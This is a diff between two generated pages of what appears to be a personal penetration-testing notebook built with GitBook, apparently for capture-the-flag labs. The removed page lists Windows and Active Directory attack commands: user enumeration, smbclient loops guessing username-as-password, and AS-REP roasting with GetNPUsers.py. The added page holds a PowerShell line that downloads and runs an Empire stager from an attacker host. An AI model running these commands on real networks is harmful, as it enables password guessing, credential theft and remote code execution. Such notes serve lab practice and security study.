@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Basic Windows Enumeration · GitBook</title>
+        <title>Empire (RIP) · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,10 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="samba.html" />
+    <link rel="next" href="../linux-stuff/exploitation.html" />
     
     
-    <link rel="prev" href="../web-stuff/lfi.html" />
+    <link rel="prev" href="ldap-ad.html" />
     
 
     </head>
@@ -303,7 +303,7 @@
         
         
     
-        <li class="chapter active" data-level="3.1" data-path="basic-windows-enumeration.html">
+        <li class="chapter " data-level="3.1" data-path="basic-windows-enumeration.html">
             
                 <a href="basic-windows-enumeration.html">
             
@@ -342,7 +342,7 @@
             
         </li>
     
-        <li class="chapter " data-level="3.4" data-path="empire-rip.html">
+        <li class="chapter active" data-level="3.4" data-path="empire-rip.html">
             
                 <a href="empire-rip.html">
             
@@ -509,7 +509,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Basic Windows Enumeration</a>
+        <a href=".." >Empire (RIP)</a>
     </h1>
 </div>
 
@@ -524,25 +524,8 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="basic-windows-enumeration">Basic Windows Enumeration</h1>
-<pre><code class="lang-text">nmap -sC -sV $ip -Pn &gt; nmap
-</code></pre>
-<pre><code class="lang-text">nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&apos;cascade.local&apos; 10.10.10.18
-</code></pre>
-<pre><code class="lang-text">ldapsearch -h $ip -x -s base namingcontexts
-</code></pre>
-<pre><code class="lang-text">ldapsearch -h $ip -x -b &quot;DC=$DOMAIN,DC=COM&quot; &apos;(ObjectClass=Person)&apos; sAMAccountName | grep sAMAccountName  | awk {&apos;print $2&apos;} &gt; ldap.users
-</code></pre>
-<pre><code class="lang-text">smbclient -L //$ip
-</code></pre>
-<pre><code class="lang-text">for i in $(cat ldap.users); do smbclient -L $ip -U=$i; done
-</code></pre>
-<pre><code class="lang-text">for i in $(cat ldap.users); do smbclient -L $ip -U=$i%$i; done
-</code></pre>
-<pre><code class="lang-text">crackmapexec smb $ip --pass-pol -u &apos;&apos; -p &apos;&apos;
-</code></pre>
-<pre><code class="lang-text">GetNPUsers.py $domain/ -request -dc-ip $ip -no-pass -usersfile users.txt
-</code></pre>
+                                <h1 id="empire-rip">Empire (RIP)</h1>
+<p>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&apos;<a href="http://10.10.14.4/empire.ps1" target="_blank">http://10.10.14.4/empire.ps1</a>&apos;)&quot;</p>
 
                                 
                                 </section>
@@ -570,12 +553,12 @@
 
             
                 
-                <a href="../web-stuff/lfi.html" class="navigation navigation-prev " aria-label="Previous page: LFI">
+                <a href="ldap-ad.html" class="navigation navigation-prev " aria-label="Previous page: LDAP / AD">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="samba.html" class="navigation navigation-next " aria-label="Next page: SAMBA">
+                <a href="../linux-stuff/exploitation.html" class="navigation navigation-next " aria-label="Next page: Exploitation">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -586,7 +569,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Basic Windows Enumeration","level":"3.1","depth":1,"next":{"title":"SAMBA","level":"3.2","depth":1,"path":"windows-stuff/samba.md","ref":"windows-stuff/samba.md","articles":[]},"previous":{"title":"LFI","level":"2.3","depth":1,"path":"web-stuff/lfi.md","ref":"web-stuff/lfi.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"windows-stuff/basic-windows-enumeration.md","mtime":"2020-07-26T17:50:13.636Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-07-26T20:52:16.907Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Empire (RIP)","level":"3.4","depth":1,"next":{"title":"Exploitation","level":"4.1","depth":1,"path":"linux-stuff/exploitation.md","ref":"linux-stuff/exploitation.md","articles":[]},"previous":{"title":"LDAP / AD","level":"3.3","depth":1,"path":"windows-stuff/ldap-ad.md","ref":"windows-stuff/ldap-ad.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"windows-stuff/empire-rip.md","mtime":"2020-07-26T17:50:13.636Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-07-26T20:52:16.907Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
